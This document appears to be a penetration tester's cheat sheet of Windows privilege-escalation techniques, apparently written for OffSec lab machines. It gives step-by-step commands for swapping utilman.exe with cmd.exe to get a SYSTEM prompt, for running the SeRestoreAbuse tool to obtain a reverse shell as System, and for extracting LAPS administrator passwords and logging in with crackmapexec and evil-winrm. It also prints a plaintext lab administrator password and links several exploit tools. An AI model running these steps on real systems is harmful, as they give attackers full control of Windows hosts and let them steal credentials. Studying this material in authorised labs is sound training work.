Check privileges:
`whoami /priv`

## SeRestorePrivilege
### With GUI
1. Launch PowerShell/ISE with the SeRestore privilege present.
2. Enable the privilege with Enable-SeRestorePrivilege.ps1.
3. Rename utilman.exe to utilman.old
4. Rename cmd.exe to utilman.exe
5. Lock the console and press Win+U

### Without GUI
1. Identify a manual start service on the target machine:
	`cmd.exe /c sc queryex state=all type=service`, OR
	`Get-Service | findstr -i "manual"`, OR
	`gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name`, OR
	`gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "manual"} | select PathName,DisplayName,Name`
2. If the above commands don't work, can try to target the service `seclogon`, which should have manual restart privileges for all users
	`reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\seclogon`
	- If have `Start    REG_DWORD    0x3`, means can manual restart. Good to go!
	- Alternative command: `cmd.exe /c sc qc seclogon`
3. Check that we have the correct permissions to manipulate the service:
	`cmd.exe /c sc sdshow seclogon`
	- Example output: `D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWRPDTLOCRRC;;;IU)(A;;CCLCSWDTLOCRRC;;;SU)(A;;CCLCSWRPDTLOCRRC;;;AU)`
	- Look for `RP` in the bracket ending with `AU`
4. Transfer exploit tool https://github.com/dxnboy/redteam/blob/master/SeRestoreAbuse.exe (source: https://github.com/xct/SeRestoreAbuse/tree/main) to the target machine. This exploit uses `seclogon`.
5. Use tool with reverse shell command to get a reverse shell as System

ALTERNATIVE METHOD
1. Enable the privilege with Enable-SeRestorePrivilege.ps1
2. On target machine, go to `C:\Windows\system32`
3. Rename Utilman.exe to Utilman.old:
	`ren Utilman.exe Utilman.old`
4. Rename cmd.exe to Utilman.exe:
	`ren cmd.exe Utilman.exe`
5. Open an RDP session (unauthenticated is fine):
	`rdesktop [target ip]`
6. Press windows key + u
7. System cmd get!

## \[AD] ReadLAPSPassword
The user can read the Local Admin's password

(from Linux) Tool: https://github.com/p0dalirius/pyLAPS
`pyLAPS.py --action get -d "DOMAIN" -u "ControlledUser" -p "ItsPassword"`

After getting the password, can use it with the Local Admin user account.

Ensure password works:
`crackmapexec smb hutch.offsec -u 'Administrator' -p 'u$#3pTiLU0(e!C'`

evil-winrm:
`evil-winrm -i 192.168.186.122 -u Administrator`
then supply the password

## SeManageVolumePrivilege

1. Run the .exe file from https://github.com/CsEnox/SeManageVolumeExploit
2. Run `icacls C:/Windows`. Check that Builtin Users have full permission. 
```           
BUILTIN\Users:(M)
BUILTIN\Users:(OI)(CI)(IO)(F)
```
Then exploit the write privileges:
- Use https://github.com/sailay1996/WerTrigger to exploit the write privileges
- Use https://github.com/xct/SeManageVolumeAbuse to exploit the write privileges 
	1. https://systemweakness.com/proving-grounds-practise-active-directory-box-access-79b1fe662f4d

